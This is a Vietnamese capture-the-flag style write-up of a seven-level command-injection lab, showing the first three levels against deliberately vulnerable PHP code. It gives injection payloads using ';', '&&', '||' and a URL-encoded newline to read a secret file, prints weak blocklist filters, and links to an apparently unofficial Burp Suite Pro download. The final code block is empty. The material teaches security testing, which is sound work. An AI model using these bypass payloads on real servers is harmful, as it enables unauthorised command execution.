# CHUẨN BỊ MÔI TRƯỜNG

- Tải Docker Desktop tại [đây](https://www.docker.com/products/docker-desktop/).

    ![alt text](IMG/1/image-1.png)

    Tải và đăng nhập (tạo tài khoản cá nhân).

- Tải `burp suite pro` tại [đây](https://drive.google.com/file/d/15ERi4WExrEE4g1JLS0mgAKZKSlBRgQeV/view?usp=sharing).



- Tải File Docker của lab tại [đây]().

# LAB

Chuỗi thử thách về lỗi bảo mật `Command Injection`.

Mục tiêu của bạn là chiếm quyền điều khiển server và đọc một tập tin bí mật ở thư mục gốc (đường dẫn `/`) để chứng minh bạn đã khai thác thành công.

Thử thách này gồm 7 level.

## LAB1

- Đề bài: 

    ![alt text](IMG/1/image-2.png)

    Lab này cho chúng ta 3 lệnh là `nslookup`, `ping` và `dig` với một bottom bên cạnh để ta điền những tham số của các lệnh trên. Trang web sẽ thực hiện in ra kết quả của câu lệnh đó. Ví dụ:

    ![alt text](IMG/1/image-4.png)

    ![alt text](IMG/1/image-5.png)

- Ta có một số phương pháp để nối thêm nhiều lệnh trong Linux như là dấu `;`.

- Ví dụ:

    ```bash
    echo "Lệnh 1"; echo "Lệnh 2"
    ```

    ```bash
    # Kết quả
    Lệnh 1
    Lệnh 2
    ```

- Ta thực hiện test thử việc tiêm câu lệnh `ls -l` sau lệnh `ping` xem sao:

    ![alt text](IMG/1/image-6.png)

    Như vậy lúc này ngoài kết quả của lệnh `ping 8.8.8.8` ra thì việc ta thêm lệnh `ls -l` cũng được thực thi. Lúc này ta thực hiện `ls /` để xem thông tin của thư mục gốc (vì đề bài bảo chúng ta là đọc một tập tin bí mật ở trong thư mục gốc `/`).

- Ta thực hiện như sau `ls /`:

    ![alt text](IMG/1/image-7.png)

    như vậy lúc này ta đã thấy được tên của tệp bí mật, để đọc nội dung của tệp đó ta thực hiện lệnh `cat`:

    ```bash
    ping 8.8.8.8; cat /142awdfasd_secret.txt
    ``` 

    ![alt text](IMG/1/image-8.png)

    Lúc này ta sẽ lấy được dữ liệu bí mật.

- Source code của `LAB1`:

    ```php
    <?php
        if(isset($_POST['command'],$_POST['target'])){
            $command = $_POST['command'];
            $target = $_POST['target'];
            switch($command) {
                case "ping":
                    $cmd = "timeout 10 ping -c 4 $target 2>&1";
                    var_dump($cmd);
                    $result = shell_exec($cmd);
                    break;
                case "nslookup":
                    $result = shell_exec("timeout 10 nslookup $target 2>&1");
                    break;	
                case "dig":
                    $result = shell_exec("timeout 10 dig $target 2>&1");
                    break;
            }
            die($result);
        }
    ?>
    ```

## LAB2

- LAB2 là phiên bản đã `fix` được của LAB1, lúc này người lập trang web đã thêm một điều kiện check để chống việc chúng ta chèn thêm bằng một lệnh `if` để chống việc input đầu vào có dấu `;`.

    ```php
    <?php
        if(isset($_POST['command'],$_POST['target'])){
            $command = $_POST['command'];
            $target = $_POST['target'];
            if (strpos($target, ";") !== false) 
                die("Hacker detected!");
            switch($command) {
                case "ping":
                    $result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
                    break;
                case "nslookup":
                    $result = shell_exec("timeout 10 nslookup $target 2>&1");
                    break;	
                case "dig":
                    $result = shell_exec("timeout 10 dig $target 2>&1");
                    break;
            }
            die($result);
        }
    ?>
    ```

    ![alt text](IMG/2/image.png)

    ![alt text](IMG/2/image-1.png)

- Như vậy lúc này ta cần tìm cách để có thể tiêm thêm câu lệnh vào lệnh ping trên. Ta thấy ngoài việc nối thêm câu lệnh bằng việc sử dụng `;` thì ta có thể sử dụng `||` hoặc `&&` (bỏ qua kí tự trong black list và sử dụng các kí tự khác).

    Dấu `&&`: sẽ chạy câu lệnh sau nếu câu lệnh trước thành công.

    Dấu `||`: sẽ chạy câu lệnh sau nếu câu lệnh trước thất bại.

- Như vậy bài này ta thực hiện dùng lệnh `&&` như sau:

    ```bash 
    ping 8.8.8.8 && ls /
    ```

    ![alt text](IMG/2/image-2.png)

    ```bash
    ping 8.8.8.8 && cat /ash4zxdf_secret.txt
    ``` 

    ![alt text](IMG/2/image-4.png)

- Còn dùng lệnh `||` ta sẽ thực hiện như sau:

    ```bash
    ping 8.8.8.10000 || ls /
    ```

    Khi ta sử dụng lệnh || thì tức ta muốn thực hiện lệnh `ls /` thì ta phải khiến cho lệnh ping sai.

    ![alt text](IMG/2/image-5.png)

    ```bash
    ping 8.8.8.10000 || cat /ash4zxdf_secret.txt
    ```

    ![alt text](IMG/2/image-6.png)

## LAB3

- LAB3 đã thực hiện fix lỗi của LAB2 đó chính là đã thực hiện chặn lun dấu `;`, `&&` và `||`.

    ```php
    <?php
        if(isset($_POST['command'],$_POST['target'])){
            $command = $_POST['command'];
            $target = $_POST['target'];
            if (strpos($target, ";") !== false) 
                die("Hacker detected!");
            if (strpos($target, "&") !== false) 
                die("Hacker detected!");
            if (strpos($target, "|") !== false) 
                die("Hacker detected!");
            switch($command) {
                case "ping":
                    $result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
                    break;
                case "nslookup":
                    $result = shell_exec("timeout 10 nslookup $target 2>&1");
                    break;	
                case "dig":
                    $result = shell_exec("timeout 10 dig $target 2>&1");
                    break;
            }
            die($result);
        }
    ?>
    ```

- Do lần này không thể tiếp cận theo hướng bypass, vẫn đang theo lối mòn nhưng với LAB này thực sự phải thực hiện đi theo một hướng khác hoàn toàn. Đó là kí tự `newline` (hay còn gọi là kí tự xuống dòng hoặc `Enter` hay `\n`). 

- Như vậy lúc nây ta phải thực hiện sao cho điền được cái dấu newline này vào payload. Lúc này là lúc ta thực hiện sử dụng công cụ `burp suite`.

- Trước tiên mở `burp suite` lên, vô `Proxy` và `Open browser`:

    ![alt text](image.png)

    Lúc này burp suite sẽ mở một trang chrome của burp suite lên, bây giờ mọi việc truy cập trang web của hình sẽ được burp suite ghi lại.

    ![alt text](image-1.png)

- Bật sẵn `docker desktop`, truy cập vào `localhost:3003`.

    ![alt text](image-2.png)

    Ở trang `Proxy` vô `HTTP History` chuột phải là nhấn `Clear History` để dẽ dàng nhìn thấy gói tin gửi đi.

- Bây giờ quay lại web của burp suite gửi một gói tin check lệnh `ping 8.8.8.8`.

    ![alt text](image-3.png)

    Lúc này quay lại phần mềm burp suite ta thấy một gói tin được gửi đi.

    ![alt text](image-4.png)

    Click vào gói tin đó thì ta thấy đó chính là gói tin Request và Response của lệnh ping vừa rùi.

    ![alt text](image-5.png)

- Lúc này ta sẽ sử dụng chức năng `Send to Repeater` trong `burp suite` để thực hiện chỉnh sửa gói tin `Request`.

    Trang web muốn giao tiếp với người dùng bằng 2 gói tin laf Request và Respond, khi ta nhấn Check thì chức năng nầy sẽ giữ lại gói tin Request để cho chúng ta chỉnh sửa, chỉnh sửa xong mới thực hiện gửi gói tin đó cho máy chủ.

    Ta thực hiện chuột phải và chọn `Send to Repeater`.

    ![alt text](image-6.png)

    Lúc này ta sang phần `Repeater` thì ta thấy 1 gói tin `Respond` chưa được gửi đi, muốn gửi đi thì ta nhấn `Send`.

    ![alt text](image-7.png)

- Ta lướt xuống cuối của gói tin Respond ta sẽ thấy lệnh được gửi đi:

    ![alt text](image-8.png)

    Lúc này ta thêm `%0als /` sau phần `command=ping&target=8.8.8.8`. Sau đó ta nhấn `Send`:

    ![alt text](image-9.png)

    Như vậy lúc này ta đã có thể tiêm câu lệnh mà không cần sử dụng những kí tự như `;`, `||` hay `&&`.

    > Tại sao lại là `%0a` vì kí tự `\n` có mã ascii là `0x0A`.

    Thực hiện gửi lại gói tin với nội dung như sau:

    ```bash
    
    ``` 